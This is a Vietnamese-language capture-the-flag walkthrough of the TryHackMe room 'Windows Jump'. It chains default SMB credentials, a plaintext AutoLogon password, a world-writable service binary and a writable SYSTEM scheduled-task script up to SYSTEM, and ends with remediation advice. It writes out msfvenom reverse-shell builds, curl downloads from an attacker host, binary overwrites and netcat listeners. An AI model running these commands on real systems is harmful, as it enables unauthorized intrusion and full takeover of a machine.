@@ -1,0 +1,206 @@
+---
+title: 'Windows Jump'
+description: 'Default creds trên một SMB share guest đọc được cho truy cập RDP, một mật khẩu AutoLogon plaintext trong registry cho user thứ hai, một service binary ai cũng ghi được trao tài khoản service, và một script scheduled-task chạy bởi SYSTEM mà ghi được dẫn đến NT AUTHORITYSYSTEM.'
+date: 2026-05-31
+platform: tryhackme
+room: 'Windows Jump'
+roomUrl: 'https://tryhackme.com/room/windowsjump'
+difficulty: easy
+tags:
+  - 'windows'
+  - 'smb'
+  - 'privesc'
+  - 'rdp'
+  - 'autologon'
+  - 'weak-service-permissions'
+  - 'scheduled-tasks'
+vulnClasses:
+  - 'weak credentials'
+  - 'cleartext credentials in registry'
+  - 'weak service executable permissions'
+  - 'writable scheduled task'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Windows Jump — Default Creds SMB, Rò Rỉ AutoLogon, Một Service Binary, Và Một SYSTEM Task**
+
+_Bài walkthrough thử thách "Windows Jump" trên TryHackMe. Một máy Windows (**`PRIVESC`**) đưa ta leo qua bốn nấc local-privesc kinh điển: default credentials bị bỏ lại trên một SMB share guest đọc được, một mật khẩu AutoLogon plaintext nằm trong registry, một service có file thực thi ai cũng ghi được, và một script scheduled-task mà SYSTEM chạy nhưng một user thấp có thể sửa. Không exploit — chỉ là cấu hình sai Windows chồng bốn tầng._
+
+> Toàn bộ flag và mật khẩu đã redact. Windows Jump là phòng huấn luyện hợp pháp trên TryHackMe; mọi thao tác đều thực hiện trên mục tiêu luyện tập hợp pháp. Flag hiển thị dạng `THM{<redacted>}` và mật khẩu dạng `<redacted>`; giá trị thật được khôi phục trên máy nhưng được giấu ở đây.
+
+---
+
+### **TL;DR — toàn bộ chuỗi tấn công**
+
+<Callout type="tldr">
+
+SMB guest lộ ra một share `Public` mà `welcome.txt` chứa **default credentials** cho `thmuser` → RDP vào bằng `thmuser` → `reg query ...\Winlogon` làm lộ một **mật khẩu AutoLogon plaintext** (`DefaultUserName=notadmin`, `DefaultPassword=...`) → `runas notadmin` → `wmic` cho thấy service `THMSvc` chạy quyền `svcadmin`, và `icacls` cho thấy binary `C:\Windows\THMSVC\svc.exe` là **`Everyone:(F)`** → ghi đè nó bằng một reverse shell `msfvenom` và restart service → shell quyền `svcadmin` → `C:\Windows\Tasks\cleanup.bat` được một **scheduled task chạy bởi SYSTEM** nhưng **`svcadmin`** **ghi được** → thêm một payload → **NT AUTHORITYSYSTEM**.
+
+Bốn user, mỗi cái mở khóa bởi một bí mật hay một quyền Windows để hở toáng hoác.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-vpn-ip>
+```
+
+`nmap` cho thấy một bề mặt Windows điển hình — SMB, RDP, và WinRM — trên một máy tên `PRIVESC`:
+
+```text
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server   (Target_Name: PRIVESC)
+5985/tcp open  http            Microsoft HTTPAPI (WinRM)
+```
+
+### **Bước 1 — default creds SMB, RDP bằng** **`thmuser`**
+
+Các share liệt kê được bằng guest, và `Public` chứa một ghi chú chào mừng:
+
+```text
+smbclient -L //$IP -N          # Public share is readable
+smbclient //$IP/Public -N
+smb: \> get welcome.txt
+```
+
+```text
+cat welcome.txt
+# Welcome to CORP-NET.
+# New employee default credentials
+# Username : thmuser
+# Password : <redacted>
+# Please change your password after first login.
+```
+
+Default creds đó cho ta một phiên tương tác qua RDP:
+
+```text
+xfreerdp3 /v:$IP /u:thmuser /p:'<redacted>' /dynamic-resolution +clipboard /cert:ignore
+```
+
+### **Bước 2 — rò rỉ AutoLogon, pivot sang** **`notadmin`**
+
+Windows lưu credentials AutoLogon trong key registry `Winlogon` — dưới dạng plaintext khi nó bị cấu hình sai:
+
+```text
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+# AutoAdminLogon    REG_SZ    1
+# DefaultUserName   REG_SZ    notadmin
+# DefaultPassword   REG_SZ    <redacted>      <- clear-text password
+```
+
+<Callout type="insight">
+
+`AutoAdminLogon=1` cùng một chuỗi `DefaultPassword` nghĩa là máy tự động đăng nhập một user — và giữ mật khẩu đó trong registry dưới dạng plaintext, mọi local user đọc được. Đây là một trong những chỗ đầu tiên cần kiểm tra trên một máy Windows; ở đây nó trao thẳng cho ta tài khoản `notadmin`.
+
+</Callout>
+
+Dùng mật khẩu vừa lộ để chạy một shell quyền `notadmin`:
+
+```text
+runas /user:notadmin cmd.exe
+# ... whoami -> privesc\notadmin
+more C:\Users\notadmin\Desktop\flag2.txt
+# THM{<redacted>}
+```
+
+### **Bước 3 — quyền service-binary yếu, trở thành** **`svcadmin`**
+
+Săn một service gắn với user kế tiếp, `wmic` tìm thấy một service chạy quyền `svcadmin`:
+
+```text
+wmic service get name,pathname,startname | findstr /i "svcadmin"
+# THMSvc   C:\Windows\THMSVC\svc.exe   .\svcadmin
+```
+
+ACL của binary chính là lỗi — `Everyone` có Full Control, nên bất kỳ user nào cũng thay thế được:
+
+```text
+icacls C:\Windows\THMSVC\svc.exe
+# C:\Windows\THMSVC\svc.exe  Everyone:(F)  PRIVESC\notadmin:(I)(F)  ...
+```
+
+Xây một file thực thi reverse shell, ghi đè lên service binary, và restart service để nó chạy mã của ta với quyền `svcadmin`:
+
+```text
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f exe -o svc.exe
+# serve it (python3 -m http.server) and pull it down on the target:
+curl http://$ATTACKER_IP:8000/svc.exe -o %TEMP%/svc.exe
+copy /y %TEMP%\svc.exe C:\Windows\THMSVC\svc.exe
+net stop THMSvc & net start THMSvc
+```
+
+```text
+rlwrap nc -lvnp 4444
+# connect from $IP ...
+C:\> whoami
+privesc\svcadmin
+more C:\Users\svcadmin\Desktop\flag3.txt
+# THM{<redacted>}
+```
+
+### **Bước 4 — scheduled task SYSTEM ghi được, lên NT AUTHORITYSYSTEM**
+
+`C:\Windows\Tasks` chứa một `cleanup.bat` lạc chỗ — một script "xóa file tạm" mà một scheduled task chạy quyền SYSTEM. `svcadmin` sửa được nó:
+
+```text
+icacls C:\Windows\Tasks\cleanup.bat
+# cleanup.bat  PRIVESC\svcadmin:(I)(M)   <- Modify
+```
+
+Thêm một payload reverse shell thứ hai vào script và chờ task kích hoạt:
+
+```text
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=5555 -f exe -o shell.exe
+curl http://$ATTACKER_IP:8000/shell.exe -o %TEMP%/shell.exe
+echo %TEMP%\shell.exe >> C:\Windows\Tasks\cleanup.bat
+```
+
+```text
+rlwrap nc -lvnp 5555
+# connect from $IP ...
+C:\> whoami
+nt authority\system
+more C:\flag4.txt
+# THM{<redacted>}
+```
+
+Default creds SMB → `thmuser` → rò rỉ AutoLogon → `notadmin` → service binary → `svcadmin` → SYSTEM task → SYSTEM.
+
+### **Tác động**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). Một share guest đọc được với default creds cho truy cập ban đầu, và ba lỗi local-privesc độc lập nối chuỗi thành SYSTEM toàn phần:
+
+- **Credential yếu/mặc định trên một share guest đọc được** — truy cập tương tác không có rào cản xác thực thực sự.
+- **Mật khẩu AutoLogon plaintext trong registry** — bất kỳ local user nào đọc được mật khẩu của tài khoản khác.
+- **File thực thi service ai cũng ghi được** — ghi đè rồi restart cho thực thi mã với tài khoản service.
+- **Script chạy bởi một scheduled task SYSTEM mà ghi được** — SYSTEM trực tiếp, đặc quyền local cao nhất.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+1. **Đừng ship default creds, và đừng để chúng trên một share.** Bắt đổi mật khẩu ở lần đăng nhập đầu và xóa `welcome.txt`; hạn chế truy cập SMB guest.
+2. **Tránh AutoLogon; nếu bắt buộc, đừng lưu mật khẩu dạng plaintext.** Dùng cơ chế LSA secret, và coi `DefaultPassword` trong `Winlogon` là một phơi nhiễm cần báo cáo.
+3. **Sửa ACL của service binary.** File thực thi service chỉ được ghi bởi Administrators/SYSTEM — không bao giờ `Everyone:(F)`.
+4. **Siết chặt script của scheduled task.** Bất kỳ file nào một SYSTEM task chạy phải không ghi được bởi user thấp hơn; `C:\Windows\Tasks\cleanup.bat` phải thuộc sở hữu admin và chỉ đọc đối với họ.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **Default creds trên một share là chỗ đặt chân miễn phí.** Luôn đọc mọi file mà một phiên SMB guest phơi ra.
+- **AutoLogon trong** **`Winlogon`** **là một check privesc Windows hàng đầu.** Một `DefaultPassword` plaintext là cả một tài khoản bị trao đi.
+- **`icacls`** **trên service binary rất đáng giá.** `Everyone:(F)` trên một file thực thi mà service chạy là một pivot tức thì sang tài khoản của service đó.
+- **SYSTEM chạy scheduled task — kiểm tra ai ghi được script.** Một ACL `Modify` trên file batch của một task là con đường ngắn nhất tới SYSTEM.
+
+Cảm ơn bạn đã đọc. Windows Jump là một chuyến tham quan gọn của bốn cấu hình sai kết liễu đa số máy Windows thực tế — default creds, rò rỉ AutoLogon, ACL service yếu, và task đặc quyền ghi được.
